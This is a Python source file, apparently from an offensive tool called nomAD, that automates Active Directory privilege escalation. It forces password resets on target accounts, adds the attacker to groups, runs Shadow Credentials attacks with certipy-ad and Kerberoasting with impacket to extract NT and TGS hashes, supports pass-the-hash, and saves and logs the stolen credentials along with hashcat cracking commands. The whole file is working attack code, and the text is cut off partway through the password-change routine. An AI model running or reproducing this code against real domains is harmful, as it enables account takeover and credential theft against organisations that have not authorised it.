"""
Attack Executor Module
======================

Executes discovered attack paths and documents all actions.

Supports:
- GenericAll: Change password, add to group
- ForceChangePassword: Reset user password
- GenericWrite: Modify attributes
- WriteDACL: Modify ACLs
- WriteOwner: Take ownership

Security Note:
This module performs WRITE operations on Active Directory.
Use only in authorized penetration testing environments.
"""

import secrets
import string
import struct
from datetime import datetime
from typing import Optional, List, Callable
from dataclasses import dataclass, field

try:
    from ldap3 import (
        Server, Connection, ALL, SUBTREE, BASE,
        NTLM, MODIFY_REPLACE, MODIFY_ADD
    )
    from ldap3.extend.microsoft.modifyPassword import ad_modify_password
    from ldap3.core.exceptions import LDAPException
    LDAP3_AVAILABLE = True
except ImportError:
    LDAP3_AVAILABLE = False

from ..model.schemas import AttackPath, EdgeType


@dataclass
class AttackAction:
    """Record of a single attack action."""
    timestamp: str
    action_type: str
    source_user: str
    target_user: str
    edge_type: str
    success: bool
    details: str
    new_password: Optional[str] = None
    hash_obtained: Optional[str] = None
    error: Optional[str] = None


@dataclass
class AttackReport:
    """Full report of attack chain execution."""
    start_time: str
    end_time: str
    initial_user: str
    domain: str
    server: str
    actions: List[AttackAction] = field(default_factory=list)
    owned_users: List[str] = field(default_factory=list)
    success: bool = False
    
    def to_dict(self) -> dict:
        """Convert to dictionary for JSON export."""
        return {
            'start_time': self.start_time,
            'end_time': self.end_time,
            'initial_user': self.initial_user,
            'domain': self.domain,
            'server': self.server,
            'total_actions': len(self.actions),
            'successful_actions': sum(1 for a in self.actions if a.success),
            'owned_users': self.owned_users,
            'success': self.success,
            'actions': [
                {
                    'timestamp': a.timestamp,
                    'action_type': a.action_type,
                    'source_user': a.source_user,
                    'target_user': a.target_user,
                    'edge_type': a.edge_type,
                    'success': a.success,
                    'details': a.details,
                    'new_password': a.new_password,
                    'hash_obtained': a.hash_obtained,
                    'error': a.error
                }
                for a in self.actions
            ]
        }
    
    def to_markdown(self) -> str:
        """Generate markdown report."""
        lines = [
            "# nomAD Attack Chain Execution Report",
            "",
            f"**Start Time:** {self.start_time}",
            f"**End Time:** {self.end_time}",
            f"**Domain:** {self.domain}",
            f"**Server:** {self.server}",
            f"**Initial User:** {self.initial_user}",
            "",
            "## Summary",
            "",
            f"- Total Actions: {len(self.actions)}",
            f"- Successful: {sum(1 for a in self.actions if a.success)}",
            f"- Failed: {sum(1 for a in self.actions if not a.success)}",
            f"- Users Owned: {len(self.owned_users)}",
            "",
            "## Owned Users",
            ""
        ]
        
        for user in self.owned_users:
            lines.append(f"- {user}")
        
        lines.extend([
            "",
            "## Attack Chain Details",
            ""
        ])
        
        for i, action in enumerate(self.actions, 1):
            status = "✅ SUCCESS" if action.success else "❌ FAILED"
            lines.extend([
                f"### Step {i}: {action.action_type}",
                "",
                f"- **Time:** {action.timestamp}",
                f"- **Status:** {status}",
                f"- **Source:** {action.source_user}",
                f"- **Target:** {action.target_user}",
                f"- **Permission Used:** {action.edge_type}",
                f"- **Details:** {action.details}",
            ])
            
            if action.new_password:
                lines.append(f"- **New Password:** `{action.new_password}`")
            if action.hash_obtained:
                lines.append(f"- **Hash Obtained:** `{action.hash_obtained}`")
            if action.error:
                lines.append(f"- **Error:** {action.error}")
            
            lines.append("")
        
        return "\n".join(lines)


class AttackExecutor:
    """Executes attack chains against Active Directory.
    
    Usage:
        executor = AttackExecutor(
            server_ip="10.10.11.42",
            domain="corp.local",
            username="compromised_user",
            password="password123"
        )
        
        report = executor.execute_chain(attack_paths)
        print(report.to_markdown())
    """
    
    def __init__(
        self,
        server_ip: str,
        domain: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None,
        use_ssl: bool = False,
        verbose: bool = True,
        log_callback: Optional[Callable[[str], None]] = None
    ):
        """Initialize the attack executor.
        
        Args:
            server_ip: Domain controller IP
            domain: Domain name
            username: Current username (will change as we pivot)
            password: Current password
            ntlm_hash: NTLM hash for Pass-the-Hash (format: LM:NT or just NT)
            use_ssl: Use LDAPS (636) instead of LDAP (389)
            verbose: Print progress messages
            log_callback: Optional callback for logging
        """
        if not LDAP3_AVAILABLE:
            raise ImportError("ldap3 library required. Install with: pip install ldap3")
        
        if not password and not ntlm_hash:
            raise ValueError("Must provide either password or ntlm_hash")
        
        self.server_ip = server_ip
        self.domain = domain
        self.current_username = username
        self.current_password = password
        self.current_hash = ntlm_hash
        self.use_ssl = use_ssl
        self.verbose = verbose
        self.log_callback = log_callback
        
        # Connection state
        self.connection: Optional[Connection] = None
        self.base_dn = ",".join([f"DC={part}" for part in domain.split(".")])
        
        # Credentials for each owned user (store password or hash)
        cred_value = password if password else f"[HASH]{ntlm_hash}"
        self.credentials: dict[str, str] = {username.lower(): cred_value}
    
    def _log(self, message: str) -> None:
        """Log a message."""
        if self.verbose:
            print(message)
        if self.log_callback:
            self.log_callback(message)
    
    def _timestamp(self) -> str:
        """Get current timestamp."""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def _generate_password(self, length: int = 32) -> str:
        """Generate a random password.
        
        Args:
            length: Password length (default 32)
            
        Returns:
            Random password with mixed characters
        """
        # Ensure we have at least one of each required type
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = [
            secrets.choice(string.ascii_uppercase),
            secrets.choice(string.ascii_lowercase),
            secrets.choice(string.digits),
            secrets.choice("!@#$%^&*")
        ]
        # Fill the rest
        password.extend(secrets.choice(chars) for _ in range(length - 4))
        # Shuffle
        secrets.SystemRandom().shuffle(password)
        return ''.join(password)
    
    def connect(self, username: str = None, password: str = None, ntlm_hash: str = None) -> bool:
        """Connect to LDAP server.
        
        Args:
            username: Username to connect with (uses current if None)
            password: Password to connect with (uses current if None)
            ntlm_hash: NTLM hash for Pass-the-Hash (uses current if None)
            
        Returns:
            True if connection successful
        """
        username = username or self.current_username
        password = password or self.current_password
        ntlm_hash = ntlm_hash or self.current_hash
        
        # Determine credential to use
        auth_credential = password if password else ntlm_hash
        
        # Format for NTLM
        if '\\' not in username and '@' not in username:
            ntlm_user = f"{self.domain.split('.')[0].upper()}\\{username}"
        else:
            ntlm_user = username
        
        # Try LDAPS first (required for password changes), then fall back to LDAP
        for use_ssl, port in [(True, 636), (False, 389)]:
            try:
                server = Server(
                    self.server_ip, 
                    port=port, 
                    use_ssl=use_ssl, 
                    get_info=ALL,
                    connect_timeout=10
                )
                
                self.connection = Connection(
                    server,
                    user=ntlm_user,
                    password=auth_credential,
                    authentication=NTLM,
                    auto_bind=True
                )
                
                self.current_username = username
                self.current_password = password
                self.current_hash = ntlm_hash
                self.use_ssl = use_ssl
                
                proto = "LDAPS" if use_ssl else "LDAP"
                self._log(f"    Connected via {proto}:{port}")
                return True
                
            except Exception as e:
                continue
        
        self._log(f"[!] Connection failed - could not connect via LDAPS or LDAP")
        return False
    
    def disconnect(self) -> None:
        """Close LDAP connection."""
        if self.connection:
            try:
                self.connection.unbind()
            except:
                pass
            self.connection = None
    
    def _get_user_dn(self, username: str) -> Optional[str]:
        """Get the DN for a username.
        
        Args:
            username: sAMAccountName
            
        Returns:
            Distinguished name or None
        """
        try:
            self.connection.search(
                search_base=self.base_dn,
                search_filter=f"(sAMAccountName={username})",
                search_scope=SUBTREE,
                attributes=['distinguishedName']
            )
            
            if self.connection.entries:
                return str(self.connection.entries[0].entry_dn)
            return None
            
        except Exception as e:
            self._log(f"[!] Error finding user DN: {e}")
            return None
    
    def _is_group(self, name: str) -> bool:
        """Check if a name refers to a group (not a user).
        
        Args:
            name: sAMAccountName to check
            
        Returns:
            True if it's a group
        """
        try:
            self.connection.search(
                search_base=self.base_dn,
                search_filter=f"(&(objectClass=group)(sAMAccountName={name}))",
                search_scope=SUBTREE,
                attributes=['distinguishedName']
            )
            return len(self.connection.entries) > 0
        except Exception as e:
            # Check by common group naming patterns
            name_lower = name.lower()
            group_keywords = ['accounts', 'managers', 'admins', 'operators', 'users', 'group']
            return any(kw in name_lower for kw in group_keywords)
    
    def _get_group_dn(self, group_name: str) -> Optional[str]:
        """Get the DN for a group.
        
        Args:
            group_name: Group sAMAccountName
            
        Returns:
            Distinguished name or None
        """
        try:
            self.connection.search(
                search_base=self.base_dn,
                search_filter=f"(&(objectClass=group)(sAMAccountName={group_name}))",
                search_scope=SUBTREE,
                attributes=['distinguishedName']
            )
            
            if self.connection.entries:
                return str(self.connection.entries[0].entry_dn)
            return None
            
        except Exception as e:
            self._log(f"[!] Error finding group DN: {e}")
            return None
    
    def _is_member_of_group(self, username: str, group_name: str) -> bool:
        """Check if user is actually a member of a group using net rpc.
        
        Args:
            username: Username to check
            group_name: Group name
            
        Returns:
            True if user is in group
        """
        import subprocess
        
        try:
            cmd = [
                "net", "rpc", "group", "members",
                group_name,
                "-U", f"{self.domain.split('.')[0].upper()}\\{self.current_username}%{self.current_password}",
                "-S", self.server_ip
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                members = result.stdout.lower()
                return username.lower() in members
            return False
        except:
            return False
    
    def _add_to_group(self, action: AttackAction, group_name: str) -> AttackAction:
        """Add current user to a group using GenericAll/GenericWrite permission.
        
        Uses net rpc (more reliable) first, then LDAP as fallback.
        
        Args:
            action: AttackAction to update
            group_name: Target group name
            
        Returns:
            Updated AttackAction
        """
        import subprocess
        
        action.action_type = "Add to Group"
        
        # First check if already a member
        if self._is_member_of_group(self.current_username, group_name):
            action.success = True
            action.details = f"{self.current_username} already in {group_name}"
            self._log(f"    [+] Already a member of {group_name} (verified)")
            return action
        
        self._log(f"    [*] Adding {self.current_username} to group '{group_name}'...")
        
        # Try net rpc first (more reliable)
        try:
            cmd = [
                "net", "rpc", "group", "addmem",
                group_name,
                self.current_username,
                "-U", f"{self.domain.split('.')[0].upper()}\\{self.current_username}%{self.current_password}",
                "-S", self.server_ip
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            output = result.stderr + result.stdout
            
            if result.returncode == 0 or "MEMBER_IN_GROUP" in output:
                # Verify membership actually worked
                if self._is_member_of_group(self.current_username, group_name):
                    action.success = True
                    action.details = f"Added {self.current_username} to {group_name}"
                    self._log(f"    [+] Successfully added to {group_name}! (verified)")
                    
                    # Wait for AD replication/permission propagation
                    import time
                    self._log(f"    [*] Waiting 3s for AD permission propagation...")
                    time.sleep(3)
                    
                    return action
                else:
                    self._log(f"    [!] Command returned success but membership not verified")
            else:
                self._log(f"    [!] net rpc failed: {output[:100]}")
                
        except subprocess.TimeoutExpired:
            self._log(f"    [!] net rpc timed out")
        except Exception as e:
            self._log(f"    [!] net rpc error: {e}")
        
        # Try LDAP modify as fallback
        try:
            from ldap3 import MODIFY_ADD
            
            # Get group DN
            group_dn = self._get_group_dn(group_name)
            if not group_dn:
                action.error = f"Could not find group DN for {group_name}"
                return action
            
            # Get current user DN
            user_dn = self._get_user_dn(self.current_username)
            if not user_dn:
                action.error = f"Could not find DN for {self.current_username}"
                return action
            
            self._log(f"    [*] Trying LDAP modify...")
            
            result = self.connection.modify(
                group_dn,
                {'member': [(MODIFY_ADD, [user_dn])]}
            )
            
            if result:
                action.success = True
                action.details = f"Added {self.current_username} to {group_name} via LDAP"
                self._log(f"    [+] Successfully added to {group_name}!")
                return action
            else:
                ldap_error = self.connection.result.get('description', 'Unknown error')
                if "entryAlreadyExists" in ldap_error or "already" in ldap_error.lower():
                    action.success = True
                    action.details = f"{self.current_username} already in {group_name}"
                    self._log(f"    [+] Already a member of {group_name}")
                    return action
                action.error = f"LDAP modify failed: {ldap_error}"
                
        except Exception as e:
            action.error = f"Failed to add to group: {str(e)}"
        
        return action
    
    def execute_chain(self, attack_paths: List[AttackPath]) -> AttackReport:
        """Execute a chain of attacks.
        
        Args:
            attack_paths: List of AttackPath objects from the path finder
            
        Returns:
            AttackReport documenting all actions
        """
        report = AttackReport(
            start_time=self._timestamp(),
            end_time="",
            initial_user=self.current_username,
            domain=self.domain,
            server=self.server_ip,
            owned_users=[self.current_username]
        )
        
        # Track groups joined during attack
        groups_joined = []
        
        self._log(f"\n{'='*60}")
        self._log("ATTACK CHAIN EXECUTION")
        self._log(f"{'='*60}")
        self._log(f"[*] Initial user: {self.current_username}")
        self._log(f"[*] Domain: {self.domain}")
        self._log(f"[*] Target: {self.server_ip}")
        self._log(f"[*] Pivots to execute: {len(attack_paths)}")
        self._log("")
        
        # Connect with initial credentials
        if not self.connect():
            report.end_time = self._timestamp()
            report.success = False
            return report
        
        # Track groups we've already joined
        joined_groups = set()
        
        # Execute each pivot
        for i, path in enumerate(attack_paths, 1):
            source_name = path.properties.get('source_name', 'unknown')
            target_name = path.properties.get('target_name', 'unknown')
            edge_type = path.properties.get('edge_type', 'unknown')
            via_group = path.properties.get('via_group')  # Intermediate group
            
            self._log(f"[*] Step {i}/{len(attack_paths)}: {source_name} → {target_name}")
            self._log(f"    Permission: {edge_type}")
            
            # If this attack path goes through a group, add ourselves to it first
            if via_group and via_group not in joined_groups:
                self._log(f"    [*] Path goes through group '{via_group}' - adding self first...")
                
                # Create a pseudo-action for group membership
                group_action = AttackAction(
                    timestamp=self._timestamp(),
                    action_type="Add to Group",
                    source_user=self.current_username,
                    target_user=via_group,
                    edge_type="GenericAll",
                    success=False,
                    details=""
                )
                
                group_action = self._add_to_group(group_action, via_group)
                report.actions.append(group_action)
                
                if group_action.success:
                    joined_groups.add(via_group)
                    self._log(f"    ✅ Now member of {via_group}")
                else:
                    self._log(f"    ⚠️ Could not join {via_group}: {group_action.error}")
                    # Continue anyway - might already be a member or have other access
            
            # Ensure we're connected as the source user
            if source_name.lower() != self.current_username.lower():
                if source_name.lower() in self.credentials:
                    self._log(f"    Reconnecting as {source_name}...")
                    self.disconnect()
                    if not self.connect(source_name, self.credentials[source_name.lower()]):
                        action = AttackAction(
                            timestamp=self._timestamp(),
                            action_type="Reconnect",
                            source_user=source_name,
                            target_user=target_name,
                            edge_type=edge_type,
                            success=False,
                            details=f"Failed to reconnect as {source_name}",
                            error="Connection failed"
                        )
                        report.actions.append(action)
                        continue
                else:
                    self._log(f"    [!] No credentials for {source_name}, skipping")
                    continue
            
            # Execute the attack based on edge type
            attack_method = path.properties.get('attack_method', None)
            action = self._execute_attack(source_name, target_name, edge_type, attack_method)
            report.actions.append(action)
            
            if action.success:
                # Only add to owned_users if it's a user, not a group
                if not self._is_group(target_name):
                    report.owned_users.append(target_name)
                    if action.new_password:
                        self.credentials[target_name.lower()] = action.new_password
                    self._log(f"    ✅ SUCCESS - {target_name} owned!")
                    if action.new_password:
                        self._log(f"    New password: {action.new_password}")
                else:
                    # It's a group - we joined it
                    groups_joined.append(target_name)
                    self._log(f"    ✅ SUCCESS - Joined {target_name}!")
            else:
                self._log(f"    ❌ FAILED - {action.error}")
        
        report.end_time = self._timestamp()
        report.success = len(report.owned_users) > 1
        
        self._log(f"\n{'='*60}")
        self._log("EXECUTION COMPLETE")
        self._log(f"{'='*60}")
        self._log(f"[+] Users compromised: {len(report.owned_users)}")
        for user in report.owned_users:
            pwd = self.credentials.get(user.lower(), "N/A")
            self._log(f"    - {user}: {pwd}")
        
        if groups_joined:
            self._log(f"[+] Groups joined: {len(groups_joined)}")
            for group in groups_joined:
                self._log(f"    - {group}")
        
        self.disconnect()
        return report
    
    def _execute_attack(self, source: str, target: str, edge_type: str, attack_method: str = None) -> AttackAction:
        """Execute a single attack action.
        
        Args:
            source: Source username
            target: Target username
            edge_type: Type of permission being exploited
            attack_method: Specific attack method (Kerberoast, PasswordChange, etc.)
            
        Returns:
            AttackAction documenting the result
        """
        action = AttackAction(
            timestamp=self._timestamp(),
            action_type="Exploitation",
            source_user=source,
            target_user=target,
            edge_type=edge_type,
            success=False,
            details=""
        )
        
        # Check if target is already compromised - skip if we already have NT hash
        if target.lower() in self.credentials:
            existing_cred = self.credentials[target.lower()]
            if "[NT_HASH]" in existing_cred:
                action.success = True
                action.details = f"Already compromised (NT hash)"
                self._log(f"    [+] {target} already compromised, skipping...")
                return action
        
        # Check if target is a GROUP (add self to group)
        if self._is_group(target):
            return self._add_to_group(action, target)
        
        # Check if this is a service account (use Shadow Credentials first, Kerberoast as fallback)
        is_service_account = '_svc' in target.lower() or 'svc_' in target.lower() or 'service' in target.lower()
        
        if attack_method == "Kerberoast" or is_service_account:
            return self._attack_service_account(action, target)
        
        # Get target DN
        target_dn = self._get_user_dn(target)
        if not target_dn:
            action.error = f"Could not find DN for {target}"
            return action
        
        # Handle different edge types
        if edge_type == 'AddSelfToGroup':
            # This is a group escalation - add self to the target group
            return self._add_to_group(action, target)
        elif edge_type in ['GenericAll', 'GenericWrite', 'AllExtendedRights', 'ForceChangePassword']:
            return self._change_password(action, target, target_dn)
        elif edge_type == 'WriteOwner':
            action.details = "WriteOwner - would need to take ownership first, then modify DACL"
            action.error = "WriteOwner exploitation not implemented"
            return action
        elif edge_type == 'WriteDacl':
            action.details = "WriteDACL - could add GenericAll permission to self"
            action.error = "WriteDACL exploitation not implemented"
            return action
        elif edge_type == 'AddKeyCredentialLink':
            action.details = "Shadow Credentials - would add msDS-KeyCredentialLink"
            action.error = "Shadow Credentials not implemented"
            return action
        else:
            action.error = f"Unknown edge type: {edge_type}"
            return action
    
    def _attack_service_account(self, action: AttackAction, target: str) -> AttackAction:
        """Attack a service account to obtain credentials.
        
        Priority order:
        1. Shadow Credentials (pywhisker + certipy-ad) - gets NT hash directly
        2. Kerberoast (last resort) - gets TGS hash that needs cracking
        
        Args:
            action: AttackAction to update
            target: Target username (service account)
            
        Returns:
            Updated AttackAction
        """
        # Try Shadow Credentials first (gets NT hash directly - no cracking needed)
        result = self._shadow_credentials_attack(action, target)
        
        if result.success:
            return result
        
        # Fall back to Kerberoast as last resort (requires hash cracking)
        self._log(f"    [!] Shadow Credentials failed, trying Kerberoast as last resort...")
        return self._kerberoast(action, target)
    
    def _kerberoast(self, action: AttackAction, target: str) -> AttackAction:
        """Perform targeted kerberoasting attack (LAST RESORT - requires hash cracking).
        
        Uses impacket's GetUserSPNs to request a TGS for the target user.
        NOTE: TGS hashes need to be cracked offline with hashcat/john.
        
        Args:
            action: AttackAction to update
            target: Target username (service account)
            
        Returns:
            Updated AttackAction
        """
        import subprocess
        import os
        
        action.action_type = "Kerberoast (TGS - needs cracking)"
        
        self._log(f"    [*] Attempting Kerberoast on {target} (last resort)...")
        
        # Try using impacket's GetUserSPNs
        try:
            cmd = [
                "impacket-GetUserSPNs",
                f"{self.domain}/{self.current_username}:{self.current_password}",
                "-dc-ip", self.server_ip,
                "-target-domain", self.domain,
                "-request-user", target,
                "-outputfile", f"output/{target}_tgs_hash.txt"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output_combined = result.stdout + result.stderr
            
            # Check for PKINIT error
            if "KDC_ERROR_CLIENT_NOT_TRUSTED" in output_combined or "PKINIT" in output_combined:
                action.error = f"PKINIT required for {target} - Kerberoast not possible"
                self._log(f"    [!] PKINIT required - Kerberoast failed")
                return action
            
            # Check if we got a hash
            hash_file = f"output/{target}_tgs_hash.txt"
            if os.path.exists(hash_file):
                with open(hash_file, 'r') as f:
                    hash_content = f.read().strip()
                
                if hash_content and '$krb5tgs$' in hash_content:
                    action.success = True
                    action.hash_obtained = hash_content[:100] + "..."
                    action.details = f"TGS hash obtained! Crack with: hashcat -m 13100 {hash_file} wordlist.txt"
                    self._log(f"    ⚠️  Got TGS hash for {target} (needs cracking)")
                    self._log(f"    Hash saved to: {hash_file}")
                    self._log(f"    Crack with: hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt")
                    
                    # Add to credentials as TGS hash
                    self.credentials[target.lower()] = f"[TGS_HASH]{hash_file}"
                    return action
            
            # Check stderr for errors
            if "No entries found" in output_combined:
                action.error = f"No SPN found for {target}"
                self._log(f"    [!] No SPN set on {target}")
            else:
                action.error = f"Kerberoast failed: {result.stderr[:100] if result.stderr else 'Unknown error'}"
                
        except subprocess.TimeoutExpired:
            action.error = "Kerberoast command timed out"
        except FileNotFoundError:
            action.error = "impacket-GetUserSPNs not found"
            self._log(f"    [!] impacket not installed")
        except Exception as e:
            action.error = f"Kerberoast error: {str(e)}"
        
        return action
    
    def _shadow_credentials_attack(self, action: AttackAction, target: str) -> AttackAction:
        """Perform Shadow Credentials attack using certipy-ad shadow auto.
        
        This attack:
        1. Adds msDS-KeyCredentialLink to target
        2. Authenticates with certificate to get NT hash
        3. Cleans up the key credential
        
        All done automatically by certipy-ad shadow auto.
        
        Args:
            action: AttackAction to update
            target: Target username
            
        Returns:
            Updated AttackAction
        """
        import subprocess
        import os
        import re
        
        action.action_type = "Shadow Credentials"
        
        self._log(f"    [*] Attempting Shadow Credentials on {target}...")
        
        try:
            import time
            # Use certipy-ad shadow auto - does everything in one command
            # Use unique filename to avoid overwrite prompts
            timestamp = int(time.time())
            certipy_cmd = [
                "certipy-ad", "shadow", "auto",
                "-u", f"{self.current_username}@{self.domain}",
                "-account", target,
                "-dc-ip", self.server_ip,
                "-out", f"{target}_{timestamp}"
            ]
            
            # Add authentication
            if self.current_password:
                certipy_cmd.extend(["-p", self.current_password])
            elif self.current_hash:
                certipy_cmd.extend(["-hashes", f":{self.current_hash}"])
            
            self._log(f"    [*] Running certipy-ad shadow auto...")
            
            # Run from output directory to avoid file conflicts
            import os
            
            # Get the project root (where nomad-streamlit.py is)
            script_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            
            # Try multiple possible output directories
            possible_dirs = [
                os.path.join(script_dir, "output"),  # Project root/output
                os.path.abspath("output"),
                "/home/kali/Desktop/nomAD2/output",
                os.path.join(os.getcwd(), "output"),
            ]
            
            output_cwd = None
            for d in possible_dirs:
                if os.path.isdir(d):
                    output_cwd = d
                    break
            
            if not output_cwd:
                # Create output in project root
                output_cwd = os.path.join(script_dir, "output")
                os.makedirs(output_cwd, exist_ok=True)
            
            self._log(f"    [DEBUG] Using output dir: {output_cwd}")
            
            # Delete ALL existing ccache files to avoid overwrite prompts
            try:
                for f in os.listdir(output_cwd):
                    if f.endswith('.ccache'):
                        try:
                            os.remove(os.path.join(output_cwd, f))
                            self._log(f"    [DEBUG] Removed {f}")
                        except Exception as e:
                            self._log(f"    [DEBUG] Could not remove {f}: {e}")
            except Exception as e:
                self._log(f"    [DEBUG] Error listing dir: {e}")
            
            result = subprocess.run(
                certipy_cmd, 
                capture_output=True, 
                text=True, 
                timeout=120,
                cwd=output_cwd,
                input="y\n"  # Auto-answer yes to overwrite prompts
            )
            output_combined = result.stdout + result.stderr
            
            # Strip ANSI color codes that might interfere with regex
            ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
            output_clean = ansi_escape.sub('', output_combined)
            
            # Check for permission errors FIRST
            if "INSUFF_ACCESS_RIGHTS" in output_clean or "insufficient" in output_clean.lower():
                self._log(f"    [!] Insufficient rights for Shadow Credentials")
                action.error = "Insufficient rights - need GenericWrite with msDS-KeyCredentialLink"
                return action
            
            # Debug: show relevant lines
            for line in output_clean.split('\n'):
                if 'NT hash' in line:
                    self._log(f"    [DEBUG] {line.strip()}")
            
            # Look for NT hash in output - try multiple patterns
            hash_match = re.search(r"NT hash for '[^']+': ([a-fA-F0-9]{32})", output_clean)
            if not hash_match:
                hash_match = re.search(r'NT hash.*?:\s*([a-fA-F0-9]{32})', output_clean)
            if not hash_match:
                # Try just finding any 32-char hex string on a line with "hash"
                for line in output_clean.split('\n'):
                    if 'hash' in line.lower():
                        hex_match = re.search(r'([a-fA-F0-9]{32})', line)
                        if hex_match:
                            hash_match = hex_match
                            break
            
            if hash_match:
                nt_hash = hash_match.group(1)
                action.success = True
                action.hash_obtained = nt_hash
                action.details = f"Shadow Credentials attack successful!"
                
                # Save hash to file
                hash_file = f"output/{target}_nthash.txt"
                with open(hash_file, 'w') as f:
                    f.write(f"{target}:{nt_hash}\n")
                
                self._log(f"    ✅ Got NT hash for {target}!")
                self._log(f"    Hash: {nt_hash}")
                self._log(f"    Saved to: {hash_file}")
                
                # Store in credentials (can be used with Pass-the-Hash)
                self.credentials[target.lower()] = f"[NT_HASH]{nt_hash}"
                return action
            
            # Check for other errors
            if "error" in output_combined.lower():
                action.error = f"certipy-ad failed: {output_combined[:150]}"
            else:
                action.error = f"Could not extract NT hash from output"
                self._log(f"    [DEBUG] certipy output: {output_combined[:200]}")
                
        except FileNotFoundError:
            self._log(f"    [!] certipy-ad not found")
            action.error = "certipy-ad not installed (pip install certipy-ad)"
        except subprocess.TimeoutExpired:
            action.error = "certipy-ad timed out"
        except Exception as e:
            action.error = f"Shadow Credentials error: {str(e)}"
        
        return action
    
    def _certipy_auth(self, action: AttackAction, target: str, pfx_path: str, pfx_password: str = None) -> AttackAction:
        """Use certipy-ad to authenticate with certificate and get NT hash.
        
        Args:
            action: AttackAction to update
            target: Target username
            pfx_path: Path to PFX certificate file
            pfx_password: Password for PFX file
            
        Returns:
            Updated AttackAction
        """
        import subprocess
        import os
        
        self._log(f"    [*] Authenticating with certipy-ad to get NT hash...")
        
        try:
            # Build certipy-ad auth command
            certipy_cmd = [
                "certipy-ad", "auth",
                "-pfx", pfx_path,
                "-username", target,
                "-domain", self.domain,
                "-dc-ip", self.server_ip
            ]
            
            if pfx_password:
                certipy_cmd.extend(["-password", pfx_password])
            
            result = subprocess.run(certipy_cmd, capture_output=True, text=True, timeout=120)
            output_combined = result.stdout + result.stderr
            
            # Look for NT hash in output
            # certipy outputs: "Got hash for 'user@domain': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            import re
            hash_match = re.search(r'([a-fA-F0-9]{32}:[a-fA-F0-9]{32})', output_combined)
            
            if hash_match:
                nt_hash = hash_match.group(1)
                action.success = True
                action.hash_obtained = nt_hash
                action.details = f"Shadow Credentials attack successful! Got NT hash"
                
                # Save hash to file
                hash_file = f"output/{target}_nthash.txt"
                with open(hash_file, 'w') as f:
                    f.write(f"{target}:{nt_hash}\n")
                
                self._log(f"    ✅ Got NT hash for {target}!")
                self._log(f"    Hash: {nt_hash}")
                self._log(f"    Saved to: {hash_file}")
                
                # Store in credentials
                self.credentials[target.lower()] = f"[NT_HASH]{nt_hash}"
                return action
            
            # Check for ccache file (alternative auth method)
            ccache_match = re.search(r'Saved.*?\.ccache', output_combined)
            if ccache_match:
                self._log(f"    [+] Got Kerberos ticket, trying to get NT hash...")
                # Could use the ticket for further attacks
                action.details = "Got Kerberos ticket via certificate"
            
            action.error = f"certipy-ad did not return NT hash: {output_combined[:200]}"
            
        except FileNotFoundError:
            # Try just "certipy" instead of "certipy-ad"
            self._log(f"    [!] certipy-ad not found, trying certipy...")
            try:
                certipy_cmd[0] = "certipy"
                result = subprocess.run(certipy_cmd, capture_output=True, text=True, timeout=120)
                # ... same hash extraction logic
                output_combined = result.stdout + result.stderr
                hash_match = re.search(r'([a-fA-F0-9]{32}:[a-fA-F0-9]{32})', output_combined)
                if hash_match:
                    nt_hash = hash_match.group(1)
                    action.success = True
                    action.hash_obtained = nt_hash
                    self.credentials[target.lower()] = f"[NT_HASH]{nt_hash}"
                    self._log(f"    ✅ Got NT hash: {nt_hash}")
                    return action
            except:
                pass
            action.error = "certipy-ad/certipy not installed"
        except subprocess.TimeoutExpired:
            action.error = "certipy-ad timed out"
        except Exception as e:
            action.error = f"certipy-ad error: {str(e)}"
        
        return action
    
    def _kerberoast_alternative(self, action: AttackAction, target: str) -> AttackAction:
        """Alternative kerberoasting using native tools.
        
        Args:
            action: AttackAction to update
            target: Target username
            
        Returns:
            Updated AttackAction
        """
        import subprocess
        
        # Try using GetUserSPNs.py directly
        try:
            cmd = [
                "python3", "-m", "impacket.examples.GetUserSPNs",
                f"{self.domain}/{self.current_username}:{self.current_password}",
                "-dc-ip", self.server_ip,
                "-request-user", target
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if '$krb5tgs$' in result.stdout:
                # Extract hash from output
                for line in result.stdout.split('\n'):
                    if '$krb5tgs$' in line:
                        action.success = True
                        action.hash_obtained = line[:100] + "..."
                        action.details = f"Kerberoast successful!"
                        
                        # Save to file
                        hash_file = f"output/{target}_hash.txt"
                        with open(hash_file, 'w') as f:
                            f.write(line)
                        
                        self.credentials[target.lower()] = f"[HASH_FILE]{hash_file}"
                        return action
            
            # If kerberoast failed, try shadow credentials
            return self._shadow_credentials_attack(action, target)
            
        except Exception as e:
            # Fall back to shadow credentials
            return self._shadow_credentials_attack(action, target)
    
    def _change_password(self, action: AttackAction, target: str, target_dn: str) -> AttackAction:
        """Change a user's password.
        
        Tries multiple methods:
        1. LDAP ad_modify_password (requires LDAPS)
        2. LDAP unicodePwd modification (requires LDAPS)
        3. net rpc password (works over SMB)
        4. rpcclient setuserinfo2 (works over SMB)
        
        Args:
            action: AttackAction to update
            target: Target username
            target_dn: Target distinguished name
            
        Returns:
            Updated AttackAction
        """
        import subprocess
        
        # Generate new password
        new_password = self._generate_password(32)
        action.new_password = new_password
        
        # Method 1: Try LDAP ad_modify_password (needs LDAPS)
        if self.use_ssl:
            try:
                result = ad_modify_password(
                    self.connection,
                    target_dn,
                    new_password,
                    old_password=None
                )
                
                if result:
                    action.success = True
                    action.details = f"Password changed via LDAPS ad_modify_password"
                    return action
            except Exception as e:
                self._log(f"    [*] LDAPS method failed: {e}")
        
        # Method 2: Try net rpc password (uses SMB/RPC)
        self._log(f"    [*] Trying net rpc password method...")
        try:
            cmd = [
                'net', 'rpc', 'password', target, new_password,
                '-U', f'{self.current_username}%{self.current_password}',
                '-S', self.server_ip
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                action.success = True
                action.details = f"Password changed via net rpc password"
                return action
            else:
                self._log(f"    [*] net rpc failed: {result.stderr.strip()}")
